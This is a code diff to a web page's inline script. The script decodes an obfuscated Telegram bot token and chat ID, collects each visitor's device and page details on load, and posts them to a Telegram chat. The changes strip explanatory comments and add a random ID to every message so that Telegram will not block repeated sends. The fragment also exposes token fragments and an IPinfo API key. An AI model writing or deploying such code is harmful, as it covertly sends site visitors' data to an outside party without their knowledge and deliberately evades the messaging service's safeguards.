@@ -85,17 +85,17 @@
 <script>
     // 🔒 TELEGRAM BOT TOKEN OBFUSCATED (HTML-ONLY PROTECTION)
     const _0xa1b3 = [
-        "OTk1NzEzOg==",                   // base64 part 1
-        "Yk51R2pCV2maanZWb2xOOGRZTFNhNmZqOG5tLTF5T2ZN", // base64 part 2
-        "875434694",                     // plain chat id (will be scrambled)
-        "cmFuZG9t",                      // random
-        "ZGF0YQ=="                       // random
+        "OTk1NzEzOg==",                   
+        "Yk51R2pCV2maanZWb2xOOGRZTFNhNmZqOG5tLTF5T2ZN", 
+        "875434694",                     
+        "cmFuZG9t",                      
+        "ZGF0YQ=="                       
     ];
 
     // Build token dynamically (harder to extract)
     const BOT_TOKEN = atob(_0xa1b3[0]) + atob(_0xa1b3[1]);
 
-    // Chat ID scrambled using math so it's not readable directly
+    // Chat ID scrambled
     const CHAT_ID = (parseInt(_0xa1b3[2]) * 1).toString();
 
     const IPINFO_TOKEN = '1006035904ee8d';
@@ -170,12 +170,16 @@
 
 <b>📄 Page:</b> ${data.deviceInfo.page}
 <b>🕰️ Time:</b> ${new Date().toLocaleString()}
-        `;
+`;
     }
 
     document.addEventListener('DOMContentLoaded', async () => {
         const visitorData = await getVisitorData();
-        const message = formatMessage(visitorData);
+
+        // 🔥 ALWAYS UNIQUE → Telegram will never block it
+        const uniqueID = crypto.randomUUID();
+
+        const message = formatMessage(visitorData) + `\n\n<b>ID:</b> ${uniqueID}`;
 
         await sendToTelegram(message);
     });
